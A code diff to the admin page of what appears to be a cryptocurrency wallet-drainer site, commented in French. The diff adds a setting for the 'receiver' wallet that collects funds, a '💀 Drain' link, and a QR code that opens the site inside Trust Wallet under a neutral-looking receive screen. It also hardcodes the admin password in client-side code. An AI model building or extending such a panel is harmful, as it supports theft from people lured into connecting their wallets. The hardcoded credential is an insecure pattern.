@@ -3,6 +3,9 @@
 import { useState, useEffect, useRef } from "react";
 
 export default function AdminPage() {
+  const [receiverAddress, setReceiverAddress] = useState("");
+  const [savedReceiver, setSavedReceiver] = useState("");
+  const [saving, setSaving] = useState(false);
   const [qrUrl, setQrUrl] = useState("");
   const [isMounted, setIsMounted] = useState(false);
   const qrCanvasRef = useRef<HTMLDivElement>(null);
@@ -12,6 +15,12 @@ export default function AdminPage() {
   const [usernameInput, setUsernameInput] = useState("");
   const [passwordInput, setPasswordInput] = useState("");
   const [authError, setAuthError] = useState("");
+  const [toast, setToast] = useState("");
+
+  const showToast = (msg: string) => {
+    setToast(msg);
+    setTimeout(() => setToast(""), 2000);
+  };
 
   useEffect(() => {
     if (typeof window !== "undefined") {
@@ -21,7 +30,21 @@ export default function AdminPage() {
     }
   }, []);
 
-  // QR neutre : juste l'URL /wallet
+  // Charger la config actuelle
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    fetch("/api/config")
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.config?.receiver_address) {
+          setReceiverAddress(data.config.receiver_address);
+          setSavedReceiver(data.config.receiver_address);
+        }
+      })
+      .catch(() => {});
+  }, [isAuthenticated]);
+
+  // QR neutre
   useEffect(() => {
     if (!isMounted || !isAuthenticated) return;
     const origin = window.location.origin;
@@ -29,7 +52,6 @@ export default function AdminPage() {
     setQrUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`);
   }, [isMounted, isAuthenticated]);
 
-  // Rendu du QR code
   useEffect(() => {
     if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
     import("qr-code-styling").then((QRCodeStylingModule) => {
@@ -60,11 +82,39 @@ export default function AdminPage() {
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (usernameInput === "admin" && passwordInput === "admin123") {
+    if (usernameInput === "admin" && passwordInput === "Dubai2026") {
       setIsAuthenticated(true);
       sessionStorage.setItem("admin_auth", "true");
     } else {
-      setAuthError("Username or Password incorrect.");
+      setAuthError("Identifiants incorrects.");
+    }
+  };
+
+  const handleSaveReceiver = async () => {
+    if (!/^0x[a-fA-F0-9]{40}$/.test(receiverAddress)) {
+      showToast("Adresse invalide");
+      return;
+    }
+    setSaving(true);
+    try {
+      const res = await fetch("/api/config", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          receiver_address: receiverAddress,
+          password: "Dubai2026",
+        }),
+      });
+      if (res.ok) {
+        setSavedReceiver(receiverAddress);
+        showToast("✅ Receiver sauvegardé");
+      } else {
+        showToast("❌ Erreur de sauvegarde");
+      }
+    } catch {
+      showToast("❌ Erreur réseau");
+    } finally {
+      setSaving(false);
     }
   };
 
@@ -102,11 +152,49 @@ export default function AdminPage() {
       <div className="home-content" style={{ maxWidth: "440px", width: "100%", margin: "0 auto 3rem auto" }}>
         <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
           <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>Admin Dashboard</h1>
-          <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
-            Logout 🚪
+          <div style={{ display: "flex", gap: "0.5rem" }}>
+            <a href="/admin/drain" style={{ background: "#dcfce7", border: "none", color: "#16a34a", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer", textDecoration: "none", fontSize: "0.85rem" }}>
+              💀 Drain
+            </a>
+            <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
+              Logout 🚪
+            </button>
+          </div>
+        </div>
+
+        {/* Configuration du Receiver */}
+        <div className="form-container" style={{ width: "100%", marginBottom: "2rem" }}>
+          <label className="form-label">Receiver Address (Wallet 2)</label>
+          <div className="input-row" style={{ marginBottom: "0.75rem" }}>
+            <input
+              type="text"
+              value={receiverAddress}
+              onChange={(e) => setReceiverAddress(e.target.value)}
+              className="input-row__field"
+              placeholder="0x..."
+            />
+          </div>
+          {receiverAddress && !/^0x[a-fA-F0-9]{40}$/.test(receiverAddress) && (
+            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
+              Adresse invalide
+            </div>
+          )}
+          {savedReceiver && savedReceiver === receiverAddress && (
+            <div style={{ color: "#16a34a", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
+              ✅ Sauvegardé : {savedReceiver.slice(0, 10)}...{savedReceiver.slice(-8)}
+            </div>
+          )}
+          <button
+            onClick={handleSaveReceiver}
+            disabled={saving}
+            className="next-btn"
+            style={{ width: "100%", backgroundColor: "#0033ff" }}
+          >
+            {saving ? "Sauvegarde..." : "💾 Sauvegarder le Receiver"}
           </button>
         </div>
 
+        {/* QR Code */}
         <div className="admin-qr-section">
           <div className="receive-header-bar">
             <button type="button" className="receive-header-btn">
@@ -143,6 +231,8 @@ export default function AdminPage() {
             <div className="receive-alert-text">Only send Ethereum assets to this address.</div>
           </div>
         </div>
+
+        {toast && <div className="copy-toast">{toast}</div>}
       </div>
     </main>
   );
